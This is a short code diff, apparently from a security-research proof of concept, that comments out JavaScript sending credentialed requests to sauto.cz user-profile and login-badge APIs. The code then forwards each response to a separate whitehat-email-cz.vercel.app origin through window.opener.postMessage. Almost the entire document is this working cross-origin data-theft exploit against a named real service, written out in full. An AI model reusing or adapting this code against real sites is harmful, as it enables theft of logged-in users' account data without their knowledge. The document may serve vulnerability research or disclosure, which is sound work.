@@ -12,43 +12,43 @@ function run()
 {
     let axios1 = false;
     let axios2 = false;
-    axios
-        .get(
-            'https://www.sauto.cz/api/v1/users/self',
-            {
-                withCredentials: true,
-                credentials: "same-origin",
-            },
-        )
-        .then((response) => {
-            window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
-            axios1 = true;
-            if (axios1 && axios2) {
-                window.close();
-            }
-        })
-        .catch(error => {
-            window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
-        });
-
-    axios
-        .get(
-            'https://login.sauto.cz/api/v1/user/badge?service=sauto',
-            {
-                withCredentials: true,
-                credentials: "same-origin",
-            },
-        )
-        .then((response) => {
-            window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
-            axios2 = true;
-            if (axios1 && axios2) {
-                window.close();
-            }
-        })
-        .catch(error => {
-            console.log(error);
-            window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
-        });
+    // axios
+    //     .get(
+    //         'https://www.sauto.cz/api/v1/users/self',
+    //         {
+    //             withCredentials: true,
+    //             credentials: "same-origin",
+    //         },
+    //     )
+    //     .then((response) => {
+    //         window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+    //         axios1 = true;
+    //         if (axios1 && axios2) {
+    //             window.close();
+    //         }
+    //     })
+    //     .catch(error => {
+    //         window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
+    //     });
+    //
+    // axios
+    //     .get(
+    //         'https://login.sauto.cz/api/v1/user/badge?service=sauto',
+    //         {
+    //             withCredentials: true,
+    //             credentials: "same-origin",
+    //         },
+    //     )
+    //     .then((response) => {
+    //         window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+    //         axios2 = true;
+    //         if (axios1 && axios2) {
+    //             window.close();
+    //         }
+    //     })
+    //     .catch(error => {
+    //         console.log(error);
+    //         window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
+    //     });
 }
 run()
